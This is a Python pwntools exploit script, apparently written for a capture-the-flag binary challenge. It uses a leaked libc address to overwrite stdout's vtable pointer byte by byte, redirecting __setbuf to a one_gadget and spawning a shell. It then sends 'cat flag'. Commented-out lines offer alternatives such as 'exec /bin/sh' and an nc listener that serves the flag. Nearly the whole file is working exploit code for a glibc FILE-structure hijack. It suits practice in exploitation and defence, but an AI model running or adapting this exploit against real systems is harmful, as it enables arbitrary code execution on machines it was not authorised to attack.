# -*- coding: utf-8 -*-
from pwn import *
import zio

g_fname = args.FNAME 
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
	g_io = process(g_fname)
    #g_io = zio.zio(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))
    #g_io = zio.zio((rhost, int(rport)))

g_libc = ELF(g_libcname)

def getpid():
	if (args.LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def pwn():
    ru(b"here is a gift ")
    addr_sleep = int(ru(',', drop=True), 16)
    #addr_sleep = int(ru(b',', keep=False), 16)
    libc_base = addr_sleep - g_libc.sym["sleep"]
    #one_gadget = libc_base + 0xf02b0     # offset of lib64.so from remote.
    one_gadget = libc_base + 0xf03b0    # libc-2.23.so of ubuntu16@local-docker
    log.debug("addr_sleep=%#x\n\tlibc@%#x\n\tone_gadget@%#x"
        , addr_sleep
        , libc_base
        , one_gadget
    )
    ru(b"good luck ;)")

    g_libc.address = libc_base
    addr_stdout = g_libc.sym["_IO_2_1_stdout_"]
    addr_stderr = g_libc.sym["_IO_2_1_stderr_"]
    addr_fake_vtb = addr_stderr + 0xa0 - 0x58 # offset of _wide_data
    log.debug("stdout@%#x\n\tstderr@%#x\n\tfake_vtable@%#x"
        , addr_stdout
        , addr_stderr
        , addr_fake_vtb
    )        

    for i in range(2):
        s(p64(addr_stdout + 0xd8 + i))
        s(p64(addr_fake_vtb)[i:i+1])

    #getpid()
    # target is __setbuf
    addr_target = addr_fake_vtb + 0x58
    for i in range(3):
        s(p64(addr_target + i))
        s(p64(one_gadget)[i:i+1])

    #sl(b"exec /bin/sh 1>&0")
    sl(b"cat flag 1>&0")
    #sl("sh >&0")
    #sl(b"nc -c 'cat ./flag' -lp 55555")
    sleep(0.1)

if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()
